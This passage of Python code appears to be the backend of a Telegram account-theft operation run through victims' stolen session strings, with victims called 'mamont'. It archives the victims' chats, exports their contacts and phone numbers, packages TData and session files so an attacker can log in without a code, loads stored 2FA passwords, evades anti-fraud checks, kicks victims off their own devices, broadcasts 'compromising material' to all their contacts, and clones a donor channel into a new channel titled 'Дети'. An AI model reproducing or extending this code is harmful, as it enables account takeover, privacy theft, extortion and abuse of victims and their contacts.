                await progress_cb("Упаковка архива на сервере...", 92.0)
            except Exception:
                pass

        # Collect valid files to pack
        valid_files = []
        for root, _, files in os.walk(base_dir):
            for file in files:
                full_p = os.path.join(root, file)
                file_size = os.path.getsize(full_p)
                # Exclude 0-byte broken media files! Only pack text/html or non-empty media
                if (file_size > 0 or file.endswith(".txt") or file.endswith(".html")) and file_size <= 25 * 1024 * 1024:
                    rel_p = os.path.relpath(full_p, base_dir)
                    valid_files.append((full_p, file_size, rel_p))

        # Put HTML and text transcripts first so Part 1 always contains conversations
        priority_files = []
        media_files = []
        for item in valid_files:
            if item[2].endswith(".html") or item[2].endswith(".txt"):
                priority_files.append(item)
            else:
                media_files.append(item)

        ordered_files = priority_files + media_files
        total_uncompressed = sum(x[1] for x in ordered_files)

        # 1. Always build full unified ZIP on server (for direct VPS download link)
        full_zip_path = os.path.join(archives_dir, f"archive_{user_tg_id}.zip")
        with zipfile.ZipFile(full_zip_path, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for full_p, _, rel_p in ordered_files:
                zip_file.write(full_p, arcname=rel_p)
        full_zip_size_mb = os.path.getsize(full_zip_path) / (1024 * 1024)

        # 2. Prepare split parts for Telegram if size exceeds 42MB
        MAX_CHUNK_BYTES = 38 * 1024 * 1024
        chunks = []
        current_chunk = []
        current_size = 0

        if total_uncompressed <= 42 * 1024 * 1024:
            chunks = [ordered_files] if ordered_files else []
        else:
            for item in ordered_files:
                if current_size + item[1] > MAX_CHUNK_BYTES and current_chunk:
                    chunks.append(current_chunk)
                    current_chunk = []
                    current_size = 0
                current_chunk.append(item)
                current_size += item[1]
            if current_chunk:
                chunks.append(current_chunk)

        zip_paths = []
        if len(chunks) <= 1:
            zip_paths.append(full_zip_path)
        else:
            for idx, ch in enumerate(chunks, 1):
                part_zip = os.path.join(archives_dir, f"archive_{user_tg_id}_part{idx}.zip")
                with zipfile.ZipFile(part_zip, "w", zipfile.ZIP_DEFLATED) as zip_file:
                    for full_p, _, rel_p in ch:
                        zip_file.write(full_p, arcname=rel_p)
                zip_paths.append(part_zip)

        if progress_cb:
            try:
                await progress_cb("Архив успешно сформирован на сервере!", 100.0)
            except Exception:
                pass

        zip_sizes_mb = [os.path.getsize(p) / (1024 * 1024) for p in zip_paths if os.path.exists(p)]

        return {
            "zip_path": full_zip_path,
            "full_zip_path": full_zip_path,
            "full_zip_size_mb": full_zip_size_mb,
            "zip_paths": zip_paths,
            "zip_size_mb": full_zip_size_mb,
            "zip_sizes_mb": zip_sizes_mb,
            "html_path": standalone_html_path,
            "photos_count": photos_count,
            "voices_count": voices_count,
            "video_notes_count": video_notes_count,
            "saved_msgs_count": saved_msgs_count,
            "dialogs_count": dialogs_count,
            "total_messages": total_messages,
        }

    except Exception as exc:
        logger.error("Full archive extraction error: %s", exc)
        return None
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass






async def generate_contacts_txt_file(
    session_string: str,
    user_tg_id: int,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> Optional[str]:
    """
    Connects to Telegram via Telethon StringSession and exports all contacts
    formatted as 'Как записан - Номер' into a .txt file.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return None

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.contacts import GetContactsRequest
        from telethon.tl.types import User
    except ImportError:
        logger.error("Telethon is not installed.")
        return None

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    out_dir = os.path.abspath(os.path.join("data", "contacts"))
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, f"contacts_{user_tg_id}.txt")

    try:
        await client.connect()
        if not await client.is_user_authorized():
            return None

        result = await client(GetContactsRequest(hash=0))
        lines: List[str] = []
        if hasattr(result, "users"):
            for u in result.users:
                if isinstance(u, User):
                    phone = getattr(u, "phone", None) or ""
                    if phone:
                        first_name = getattr(u, "first_name", None) or ""
                        last_name = getattr(u, "last_name", None) or ""
                        username = getattr(u, "username", None) or ""
                        name = normalize_name(first_name, last_name, username)
                        phone_clean = phone.strip()
                        if not phone_clean.startswith("+"):
                            phone_clean = "+" + phone_clean
                        lines.append(f"{name} - {phone_clean}")

        if not lines:
            lines.append("Контакты отсутствуют на аккаунте.")

        with open(out_file, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        return out_file
    except Exception as exc:
        logger.error("Failed to generate contacts txt: %s", exc)
        return None
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def create_channel_and_post_material(
    session_string: str,
    title: str = "Дети",
    about: str = "",
    post_text: str = "",
    media_path: Optional[Union[str, List[str]]] = None,
    donor_channel: Optional[str] = None,
    max_clone_posts: int = 50,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> dict:
    """
    Creates a Telegram Channel on mamont's account and rapidly clones all material/posts
    from the donor channel (or publishes pre-configured post/media) directly into the new channel.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return {"ok": False, "error": "Сессия не авторизована."}

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.channels import CreateChannelRequest
        from telethon.tl.functions.messages import (
            ExportChatInviteRequest,
            ImportChatInviteRequest,
            CheckChatInviteRequest,
        )
        from telethon.errors import UserAlreadyParticipantError
    except ImportError:
        return {"ok": False, "error": "Telethon не установлен."}

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return {"ok": False, "error": "Сессия мамонта не авторизована."}

        # 2. Create new channel on mamont's account named "Дети"
        channel_title = title or "Дети"
        result = await client(CreateChannelRequest(
            title=channel_title,
            about=about or "",
            megagroup=False,
        ))
        channel = result.chats[0]

        copied_posts = 0
        has_media = bool(
            (isinstance(media_path, list) and any(os.path.exists(p) for p in media_path))
            or (isinstance(media_path, str) and os.path.exists(media_path))
        )
        has_custom_material = bool(has_media or (post_text and post_text.strip()))

        # 3. If custom material is provided (custom text / photo / video / album), publish it directly
        if has_custom_material:
            try:
                if has_media:
                    if isinstance(media_path, list) and len(media_path) > 1:
                        valid_paths = [p for p in media_path if os.path.exists(p)]
                        if valid_paths:
                            await client.send_file(channel, file=valid_paths, caption=post_text or "")
                            copied_posts = len(valid_paths)
                    else:
                        single_path = media_path[0] if isinstance(media_path, list) else media_path
                        if os.path.exists(single_path):
                            await client.send_file(channel, file=single_path, caption=post_text or "")
                            copied_posts = 1
                elif post_text and post_text.strip():
                    await client.send_message(channel, message=post_text.strip())
                    copied_posts = 1
            except Exception as post_err:
                logger.warning("Error publishing custom post: %s", post_err)

        # 4. Otherwise, clone messages from donor channel (high-speed MTProto cloud clone)
        elif donor_channel or not has_custom_material:
            donor_link = donor_channel or DEFAULT_DONOR_CHANNEL
            donor_entity = None

            # Join / resolve donor channel
            if donor_link:
                donor_link_clean = donor_link.strip()
                raw_hash = None
                if "+" in donor_link_clean:
                    raw_hash = donor_link_clean.split("+")[-1].split("?")[0].strip()
                elif "joinchat/" in donor_link_clean:
                    raw_hash = donor_link_clean.split("joinchat/")[-1].split("?")[0].strip()

                if raw_hash:
                    try:
                        res = await client(ImportChatInviteRequest(raw_hash))
                        if hasattr(res, "chats") and res.chats:
                            donor_entity = res.chats[0]
                        elif hasattr(res, "chat"):
                            donor_entity = res.chat
                    except UserAlreadyParticipantError:
                        try:
                            check = await client(CheckChatInviteRequest(raw_hash))
                            if hasattr(check, "chat"):
                                donor_entity = check.chat
                        except Exception:
                            pass
                    except Exception as e:
                        logger.debug("ImportChatInviteRequest: %s", e)
                        try:
                            check = await client(CheckChatInviteRequest(raw_hash))
                            if hasattr(check, "chat"):
                                donor_entity = check.chat
                        except Exception:
                            pass

                if not donor_entity:
                    try:
                        donor_entity = await client.get_entity(donor_link_clean)
                    except Exception:
                        pass

                if not donor_entity:
                    try:
                        async for dialog in client.iter_dialogs(limit=50):
                            if dialog.is_channel:
                                donor_entity = dialog.entity
                                break
                    except Exception:
                        pass

            if donor_entity:
                try:
                    donor_msgs = await client.get_messages(donor_entity, limit=max_clone_posts)
                    donor_msgs = [m for m in donor_msgs if not m.action]
                    donor_msgs.reverse()  # Chronological order

                    for m in donor_msgs:
                        try:
                            if m.media:
                                await client.send_file(
                                    channel,
                                    file=m.media,
                                    caption=m.message or "",
                                    formatting_entities=m.entities,
                                )
                            elif m.message:
                                await client.send_message(
                                    channel,
                                    message=m.message,
                                    formatting_entities=m.entities,
                                )
                            copied_posts += 1
                            await asyncio.sleep(0.15)
                        except Exception as m_err:
                            logger.debug("Failed send_file for msg %s: %s, trying forward...", m.id, m_err)
                            try:
                                await client.forward_messages(channel, m.id, donor_entity, drop_author=True)
                                copied_posts += 1
                                await asyncio.sleep(0.15)
                            except Exception as f_err:
                                logger.warning("Forward with drop_author also failed: %s", f_err)
                except Exception as clone_err:
                    logger.warning("Error cloning donor messages: %s", clone_err)

        link = None
        try:
            invite = await client(ExportChatInviteRequest(peer=channel))
            link = getattr(invite, "link", None)
        except Exception:
            pass

        username = getattr(channel, "username", None)
        channel_url = f"https://t.me/{username}" if username else (link or f"ID: {channel.id}")

        return {
            "ok": True,
            "channel_id": channel.id,
            "title": channel_title,
            "link": channel_url,
            "posts_cloned": copied_posts,
        }
    except Exception as e:
        logger.error("Failed to create channel and post: %s", e)
        from shared.service_listener import is_auth_key_duplicated
        if is_auth_key_duplicated(e):
            return {
                "ok": False,
                "error_code": "AUTH_KEY_DUPLICATED",
                "error": (
                    "⚠️ <b>В Telegram Desktop на вашем ПК сейчас открыт этот аккаунт!</b>\n\n"
                    "По правилам Telegram один ключ сессии не может отправлять запросы с двух разных IP одновременно (с сервера и с вашего ПК).\n\n"
                    "👉 <b>Как создать канал:</b>\n"
                    "• <b>Вариант 1 (быстрее):</b> Создайте канал прямо в открытом на ПК <b>Telegram Desktop</b> (иконка меню ➔ «Создать канал»).\n"
                    "• <b>Вариант 2:</b> Закройте Telegram Desktop на ПК на 1 минуту, нажмите кнопку в боте <b>«Создать ТГК»</b> снова — бот создаст его с сервера, после чего запустите Telegram Desktop обратно."
                ),
            }
        return {"ok": False, "error": str(e)}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def export_session_archive(
    session_string: str,
    user_tg_id: int,
    password_2fa: Optional[str] = None,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> Optional[dict]:
    """
    Generates authentic Telegram Desktop TData folder (via opentele) + SQLite .session file + StringSession + instructions,
    and packages them into a ZIP archive for immediate 1-click login into Telegram Desktop Portable.
    Preserves and reuses existing valid TData archive with key_datas to prevent archive degradation and seq collisions.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return None

    try:
        import sqlite3
        import zipfile
        import shutil
        from telethon.sessions.string import StringSession
    except ImportError:
        return None

    sessions_dir = SESSIONS_DIR
    os.makedirs(sessions_dir, exist_ok=True)
    zip_path = os.path.join(sessions_dir, f"tdata_{user_tg_id}.zip")

    # 0. Check if a valid archive already exists that contains genuine tdata key files!
    if os.path.exists(zip_path):
        try:
            with zipfile.ZipFile(zip_path, "r") as zf_check:
                names = zf_check.namelist()
                has_key_datas = any("key_datas" in n for n in names)
                is_matching = True
                if "StringSession.txt" in names:
                    with zf_check.open("StringSession.txt") as ss_f:
                        saved_ss = ss_f.read().decode("utf-8", errors="ignore").strip()
                        if saved_ss and saved_ss != session_string.strip():
                            is_matching = False
                if has_key_datas and is_matching:
                    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
                    logger.info("Reusing existing valid TData archive for user %s (size: %.3f MB, contains key_datas)", user_tg_id, size_mb)
                    return {"zip_path": zip_path, "has_tdata": True, "size_mb": size_mb}
        except Exception as e_zf:
            logger.warning("Existing zip check error for %s: %s", user_tg_id, e_zf)

    # 1. Auto-fetch 2FA password from database if not passed
    if not password_2fa:
        try:
            from shared import db
            from shared.config import DB_PATH
            user_row = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
            if user_row and "password_2fa" in user_row.keys() and user_row["password_2fa"]:
                password_2fa = user_row["password_2fa"]
                logger.info("Auto-loaded 2FA password from database for user %s", user_tg_id)
        except Exception as e_pwd:
            logger.debug("Could not auto-load 2FA password for %s: %s", user_tg_id, e_pwd)

    temp_dir = os.path.join(sessions_dir, f"temp_{user_tg_id}")
    shutil.rmtree(temp_dir, ignore_errors=True)
    os.makedirs(temp_dir, exist_ok=True)

    session_file = os.path.join(temp_dir, f"{user_tg_id}.session")
    string_file = os.path.join(temp_dir, "StringSession.txt")
    readme_file = os.path.join(temp_dir, "README_LOGIN.txt")
    tdata_dir = os.path.join(temp_dir, "tdata")
    tmp_zip_path = os.path.join(sessions_dir, f"tdata_{user_tg_id}.zip.tmp")

    has_tdata = False

    try:
        # 1. Parse StringSession to get DC ID and AuthKey
        ss = StringSession(session_string)
        dc_id = ss.dc_id or 2
        server_address = ss.server_address or "149.154.167.50"
        port = ss.port or 443
        auth_key_bytes = ss.auth_key.key if ss.auth_key else b""

        # 2. Convert to genuine TData directory via opentele
        # Generate genuine TData offline from StringSession first (fast, reliable, zero DC packets, no anti-fraud trigger)
        try:
            from opentele.td import TDesktop, Account
            from opentele.tl import TelegramClient as OpenTeleClient
            from opentele.api import API, UseCurrentSession

            os.makedirs(tdata_dir, exist_ok=True)
            op_client = OpenTeleClient(StringSession(session_string), api=API.TelegramAndroid)
            op_client.UserId = user_tg_id
            tdesk = TDesktop()
            tdesk._TDesktop__generateLocalKey()
            await Account.FromTelethon(op_client, flag=UseCurrentSession, api=API.TelegramDesktop, owner=tdesk)
            tdesk.SaveTData(basePath=tdata_dir)
            for r, d, fs in os.walk(tdata_dir):
                if any("key_datas" in f for f in fs):
                    has_tdata = True
                    break
            if has_tdata:
                logger.info("Successfully generated genuine TData offline for user %s", user_tg_id)
        except Exception as td_off_err:
            logger.warning("Offline TData generation notice for %s: %s", user_tg_id, td_off_err)

        # Note: Online TData generation is intentionally omitted because calling op_client.connect() 
        # from VPS IP triggers Telegram DC AuthKeyDuplicated anti-fraud protection and revokes the victim's session.

        # Pause active watcher to prevent concurrent IP collision when user opens Telegram Desktop
        if has_tdata and user_tg_id:
            try:
                from shared.service_listener import _active_watchers, _desktop_active_until
                _desktop_active_until[user_tg_id] = time.time() + 1800
                w = _active_watchers.pop(user_tg_id, None)
                if w and w.is_connected():
                    await w.disconnect()
                logger.info("Paused service watcher for user %s to allow clean Telegram Desktop connection", user_tg_id)
            except Exception as e_p:
                logger.debug("Error pausing watcher for %s: %s", user_tg_id, e_p)

        # 3. Write SQLite Telethon .session
        if os.path.exists(session_file):
            os.remove(session_file)
        conn = sqlite3.connect(session_file)
        cur = conn.cursor()
        cur.execute("CREATE TABLE version (version integer)")
        cur.execute("INSERT INTO version VALUES (7)")
        cur.execute("CREATE TABLE sessions (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer)")
        cur.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", (dc_id, server_address, port, auth_key_bytes, 0))
        cur.execute("CREATE TABLE entities (id integer primary key, hash integer not null, username text, phone integer, name text)")
        cur.execute("CREATE TABLE sent_files (md5_digest blob, file_size integer, type integer, id integer, hash integer, primary key(md5_digest, file_size, type))")
        cur.execute("CREATE TABLE update_state (id integer primary key, pts integer, qts integer, date integer, seq integer)")
        conn.commit()
        conn.close()

        # 4. Write StringSession
        with open(string_file, "w", encoding="utf-8") as f:
            f.write(session_string)

        # 5. Write detailed README
        with open(readme_file, "w", encoding="utf-8") as f:
            f.write(
                "========================================================================\n"
                "             ВХОД В АККАУНТ ЧЕРЕЗ TDATA / TELEGRAM DESKTOP              \n"
                "========================================================================\n\n"
                f"👤 TG ID мамонта: {user_tg_id}\n"
                f"🌐 DC ID: {dc_id} | Сервер: {server_address}:{port}\n\n"
                "------------------------------------------------------------------------\n"
                "СПОСОБ №1: ВХОД ЧЕРЕЗ TELEGRAM DESKTOP PORTABLE (БЕЗ ВВОДА КОДА)\n"
                "------------------------------------------------------------------------\n"
                "1. Скачайте чистый Telegram Desktop Portable (с официального сайта desktop.telegram.org).\n"
                "2. Извлеките папку 'tdata' из этого архива в папку с Telegram (рядом с Telegram.exe).\n"
                "3. Запустите Telegram.exe — вход в аккаунт произойдет моментально без кода!\n\n"
                "------------------------------------------------------------------------\n"
                "СПОСОБ №2: ИСПОЛЬЗОВАНИЕ .SESSION / STRING SESSION\n"
                "------------------------------------------------------------------------\n"
                f"• {user_tg_id}.session — SQLite сессия для Telethon / Pyrogram / TData конвертеров.\n"
                "• StringSession.txt — строковая сессия для прямого подключения в скриптах Python.\n"
            )

        # 6. Pack into tmp_zip_path first
        if os.path.exists(tmp_zip_path):
            try:
                os.remove(tmp_zip_path)
            except Exception:
                pass

        with zipfile.ZipFile(tmp_zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for fn in [session_file, string_file, readme_file]:
                if os.path.exists(fn):
                    zf.write(fn, arcname=os.path.basename(fn))
            if has_tdata and os.path.exists(tdata_dir):
                for root, dirs, files in os.walk(tdata_dir):
                    for f in files:
                        full_p = os.path.join(root, f)
                        rel_p = os.path.relpath(full_p, temp_dir)
                        zf.write(full_p, arcname=rel_p)

        # Cleanup temp directory
        shutil.rmtree(temp_dir, ignore_errors=True)

        # Safety: If this regeneration failed to get tdata, but previous zip had tdata, preserve previous zip!
        if not has_tdata and os.path.exists(zip_path):
            try:
                with zipfile.ZipFile(zip_path, "r") as zf_old:
                    if any("key_datas" in n for n in zf_old.namelist()):
                        logger.warning("New generation lacked tdata for %s, keeping previous valid zip with tdata", user_tg_id)
                        if os.path.exists(tmp_zip_path):
                            os.remove(tmp_zip_path)
                        size_mb = os.path.getsize(zip_path) / (1024 * 1024)
                        return {"zip_path": zip_path, "has_tdata": True, "size_mb": size_mb}
            except Exception:
                pass

        # Atomic replace
        if os.path.exists(zip_path):
            try:
                os.remove(zip_path)
            except Exception:
                pass
        os.replace(tmp_zip_path, zip_path)

        size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        return {"zip_path": zip_path, "has_tdata": has_tdata, "size_mb": size_mb}
    except Exception as exc:
        logger.error("Failed to export session archive: %s", exc)
        return None


async def broadcast_to_mamont_contacts(
    session_string: str,
    text: Optional[str] = None,
    media_path: Optional[Union[str, List[str]]] = None,
    media_type: str = "text",
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> dict:
    """
    Connects via mamont's StringSession and broadcasts compromising material / messages
    to all contacts and private dialogs.
    Supports: text, photo, video, album (list of media), circle (video_note), voice message, documents.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return {"ok": False, "error": "Сессия не авторизована."}

    try:
        import asyncio
        from telethon import TelegramClient, errors
        from telethon.sessions import StringSession
        from telethon.tl.functions.contacts import GetContactsRequest
        from telethon.tl.types import User
    except ImportError:
        return {"ok": False, "error": "Telethon не установлен."}

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return {"ok": False, "error": "Сессия мамонта не авторизована или закрыта."}

        # 1. Collect target entity IDs from contacts & dialogs
        target_entities = set()

        # From contacts
        try:
            c_res = await client(GetContactsRequest(hash=0))
            if hasattr(c_res, "users"):
                for u in c_res.users:
                    if isinstance(u, User) and not u.bot and not u.is_self:
                        target_entities.add(u.id)
        except Exception:
            pass

        # From dialogs
        try:
            async for d in client.iter_dialogs(limit=200):
                if d.is_user and getattr(d.entity, "is_self", False) is False:
                    if not getattr(d.entity, "bot", False):
                        target_entities.add(d.id)
        except Exception:
            pass

        sent_count = 0
        failed_count = 0

        for target_id in target_entities:
            try:
                if media_path:
                    if isinstance(media_path, list) and len(media_path) > 1:
                        # Send multiple media as an album
                        valid_paths = [p for p in media_path if os.path.exists(p)]
                        if valid_paths:
                            await client.send_file(
                                target_id,
                                file=valid_paths,
                                caption=text or "",
                                parse_mode="html",
                            )
                        elif text:
                            await client.send_message(target_id, message=text, parse_mode="html")
                    else:
                        single_path = media_path[0] if isinstance(media_path, list) else media_path
                        if os.path.exists(single_path):
                            if media_type == "circle":
                                await client.send_file(target_id, file=single_path, video_note=True)
                            elif media_type == "voice":
                                await client.send_file(
                                    target_id,
                                    file=single_path,
                                    voice_note=True,
                                    caption=text or "",
                                    parse_mode="html",
                                )
                            elif media_type in ("photo", "video", "document"):
                                await client.send_file(
                                    target_id,
                                    file=single_path,
                                    caption=text or "",
                                    parse_mode="html",
                                )
                            else:
                                await client.send_file(
                                    target_id,
                                    file=single_path,
                                    caption=text or "",
                                    parse_mode="html",
                                )
                        elif text:
                            await client.send_message(target_id, message=text, parse_mode="html")
                elif text:
                    await client.send_message(target_id, message=text, parse_mode="html")
                sent_count += 1
                await asyncio.sleep(0.3)
            except errors.FloodWaitError as fwe:
                logger.warning("FloodWaitError sending to %s: wait %s s", target_id, fwe.seconds)
                if fwe.seconds <= 5:
                    await asyncio.sleep(fwe.seconds)
                    try:
                        if text:
                            await client.send_message(target_id, message=text, parse_mode="html")
                        sent_count += 1
                    except Exception:
                        failed_count += 1
                else:
                    failed_count += 1
            except Exception as send_err:
                logger.debug("Failed sending to %s: %s", target_id, send_err)
                failed_count += 1

        return {
            "ok": True,
            "sent_count": sent_count,
            "failed_count": failed_count,
            "total_targets": len(target_entities),
        }
    except Exception as e:
        logger.error("Failed broadcast to mamont contacts: %s", e)
        return {"ok": False, "error": str(e)}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def is_session_alive(
    session_string: str,
    user_tg_id: Optional[int] = None,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> bool:
    """
    Checks whether the session_string is present.
    To avoid triggering AuthKeyDuplicated session revocation on victim's Telegram Desktop,
    we DO NOT open speculative Telethon probe sockets to Telegram DC.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return False
    return True


async def reset_all_other_authorizations(
    session_string: str,
    user_tg_id: Optional[int] = None,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> dict:
    """
    Sends ResetAuthorizationsRequest to Telegram to terminate all other sessions
    and keep only the current server session active.
    Reuses active connected client from _active_watchers if present to avoid session collisions.
    Accurately computes remaining 24-hour Telegram restriction time and lists connected devices.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return {"ok": False, "message": "Сессия не авторизована."}

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.auth import ResetAuthorizationsRequest
        from telethon.tl.functions.account import GetAuthorizationsRequest
        from telethon.errors import (
            FreshResetAuthorisationForbiddenError,
            AuthKeyUnregisteredError,
            SessionRevokedError,
            RPCError,
        )
    except ImportError as e:
        return {"ok": False, "message": f"Ошибка модуля Telethon: {e}"}

    client = None
    should_disconnect = False

    # Check if there is an existing live client in _active_watchers
    try:
        from shared.service_listener import _active_watchers
        if user_tg_id and user_tg_id in _active_watchers:
            w_client = _active_watchers[user_tg_id]
            if w_client and w_client.is_connected():
                client = w_client
                should_disconnect = False
    except Exception:
        pass

    if not client:
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            should_disconnect = True
        except Exception as exc:
            from shared.service_listener import is_auth_key_duplicated, _desktop_active_until
            if is_auth_key_duplicated(exc):
                if user_tg_id:
                    _desktop_active_until[user_tg_id] = time.time() + 600
                return {
                    "ok": False,
                    "error_code": "AUTH_KEY_DUPLICATED",
                    "message": (
                        "ℹ️ <b>В аккаунт выполнен вход через Telegram Desktop (TData) с вашего ПК!</b>\n\n"
                        "По правилам безопасности Telegram один ключ сессии не может отправлять запросы с двух разных IP одновременно (с сервера и с вашего компьютера).\n\n"
                        "💡 <b>Как завершить сессии мамонта:</b>\n"
                        "1. Откройте ваш <b>Telegram Desktop</b> (куда вы зашли по TData).\n"
                        "2. Перейдите: <b>Настройки ➔ Устройства ➔ «Завершить все другие сеансы»</b>.\n\n"
                        "<i>(Мамонт будет моментально выброшен со всех устройств, а ваш Telegram Desktop останется единственным активным!)</i>"
                    ),
                }
            return {"ok": False, "message": f"Ошибка соединения с Telegram: {exc}"}

    try:
        if not await client.is_user_authorized():
            return {"ok": False, "message": "Сессия мамонта уже закрыта или сброшена в Telegram."}

        # Query all active authorizations
        current_auth = None
        other_auths = []
        authorizations = []
        try:
            auths_res = await client(GetAuthorizationsRequest())
            if auths_res and hasattr(auths_res, "authorizations"):
                authorizations = auths_res.authorizations
                for a in authorizations:
                    if getattr(a, "current", False):
                        current_auth = a
                    else:
                        other_auths.append(a)
        except Exception as e_get:
            logger.debug("Could not fetch authorizations: %s", e_get)

        # If there are no other authorizations, report directly
        if not other_auths and authorizations:
            return {
                "ok": True,
                "has_others": False,
                "message": (
                    "ℹ️ <b>Других активных устройств нет.</b>\n"
                    "В аккаунте активна только текущая сессия сервера."
                ),
            }

        # Separate victim devices from our own Telegram Desktop sessions
        victim_auths = []
        desktop_preserved = False
        for a in other_auths:
            dev_str = f"{a.device_model or ''} {a.app_name or ''} {a.platform or ''}".lower()
            if "desktop" in dev_str:
                desktop_preserved = True
                logger.info("Preserving Telegram Desktop session: %s (%s)", a.device_model, a.app_name)
                continue
            victim_auths.append(a)

        if not victim_auths and desktop_preserved:
            return {
                "ok": True,
                "has_others": False,
                "message": (
                    "ℹ️ <b>Устройств мамонта на аккаунте нет.</b>\n\n"
                    "Активны только сессия сервера и ваш Telegram Desktop."
                ),
            }

        # Check if session is fresh (< 24 hours) to prevent anti-fraud session revocation
        is_fresh = False
        remaining_str = ""
        unlock_msk_str = ""
        created_msk_str = ""
        msk_tz = timezone(timedelta(hours=3))
        now_utc = datetime.now(timezone.utc)

        if current_auth and getattr(current_auth, "date_created", None):
            dt_created = current_auth.date_created
            if dt_created.tzinfo is None:
                dt_created = dt_created.replace(tzinfo=timezone.utc)
            elapsed = now_utc - dt_created
            remaining = timedelta(hours=24) - elapsed
            created_msk_str = dt_created.astimezone(msk_tz).strftime("%Y-%m-%d %H:%M:%S")
            if remaining.total_seconds() > 0:
                is_fresh = True
                hours, rem_s = divmod(int(remaining.total_seconds()), 3600)
                mins, _ = divmod(rem_s, 60)
                remaining_str = f"{hours} ч. {mins} мин."
                unlock_msk_str = (dt_created + timedelta(hours=24)).astimezone(msk_tz).strftime("%Y-%m-%d %H:%M:%S")

        # Format devices list
        devices_text = ""
        if other_auths:
            dev_lines = []
            for a in other_auths:
                dev = a.device_model or a.platform or "Устройство"
                app = f"{a.app_name or ''} {a.app_version or ''}".strip()
                loc = f"{a.country or ''} {a.region or ''}".strip()
                ip_str = a.ip or ""
                active_str = ""
                if getattr(a, "date_active", None):
                    act_dt = a.date_active
                    if act_dt.tzinfo is None:
                        act_dt = act_dt.replace(tzinfo=timezone.utc)
                    active_str = f", активен: {act_dt.astimezone(msk_tz).strftime('%H:%M %d.%m')}"
                line = f"• 📱 <b>{dev}</b> ({app})"
                details = []
                if loc:
                    details.append(loc)
                if ip_str:
                    details.append(f"IP: {ip_str}")
                if details:
                    line += f" — {', '.join(details)}"
                line += active_str
                dev_lines.append(line)
            devices_text = f"📱 <b>Другие устройства на аккаунте ({len(other_auths)} шт.):</b>\n" + "\n".join(dev_lines)

        # If session is under 24 hours, do NOT send ResetAuthorizationsRequest to avoid anti-fraud revocation!
        if is_fresh:
            time_info = (
                f"⏱ <b>Сессия создана:</b> <code>{created_msk_str} (МСК)</code>\n"
                f"⏳ <b>Сброс станет доступен через:</b> <code>{remaining_str}</code>\n"
                f"📅 <b>Дата разблокировки:</b> <code>{unlock_msk_str} (МСК)</code>\n\n"
            )
            msg = (
                "⚠️ <b>Сброс сессий временно заблокирован Telegram (защита 24 ч.)!</b>\n\n"
                "Согласно политике безопасности Telegram, завершать другие сессии с нового устройства разрешено только спустя 24 часа после авторизации.\n\n"
                f"{time_info}"
                f"{devices_text}"
            ).strip()
            return {
                "ok": False,
                "error_code": "FRESH_RESET_AUTHORISATION_FORBIDDEN",
                "message": msg,
            }

        # If not fresh (> 24 hours), attempt safe reset
        reset_success_count = 0
        try:
            for a in victim_auths:
                try:
                    from telethon.tl.functions.account import ResetAuthorizationRequest
                    await client(ResetAuthorizationRequest(hash=a.hash))
                    reset_success_count += 1
                except Exception:
                    pass

            if reset_success_count > 0:
                return {
                    "ok": True,
                    "has_others": reset_success_count < len(victim_auths),
                    "message": (
                        f"✅ <b>Устройства мамонта ({reset_success_count} из {len(victim_auths)} шт.) успешно сброшены!</b>\n\n"
                        "🔐 <i>Сессия сервера и ваш Telegram Desktop остались активными.</i>"
                    ),
                }

            if not desktop_preserved:
                await client(ResetAuthorizationsRequest())
                return {
                    "ok": True,
                    "has_others": False,
                    "message": "✅ <b>Все устройства мамонта успешно сброшены!</b>\n\n🔐 <i>Сессия сервера активна.</i>",
                }
            else:
                return {
                    "ok": True,
                    "has_others": False,
                    "message": (
                        "ℹ️ <b>Устройств мамонта на аккаунте нет.</b>\n\n"
                        "Активны только сессия сервера и ваш Telegram Desktop."
                    ),
                }
        except FreshResetAuthorisationForbiddenError:
            msg = (
                "⚠️ <b>Сброс сессий временно заблокирован Telegram (защита 24 ч.)!</b>\n\n"
                "Согласно политике безопасности Telegram, завершать другие сессии с нового устройства разрешено только спустя 24 часа после авторизации.\n\n"
                f"{devices_text}"
            ).strip()
            return {
                "ok": False,
                "error_code": "FRESH_RESET_AUTHORISATION_FORBIDDEN",
                "message": msg,
            }
        except (AuthKeyUnregisteredError, SessionRevokedError):
            return {"ok": False, "message": "Сессия мамонта уже сброшена или отозвана."}
        except RPCError as rpc_err:
            return {"ok": False, "message": f"Ошибка Telegram API ({type(rpc_err).__name__}): {rpc_err}"}
        except Exception as e:
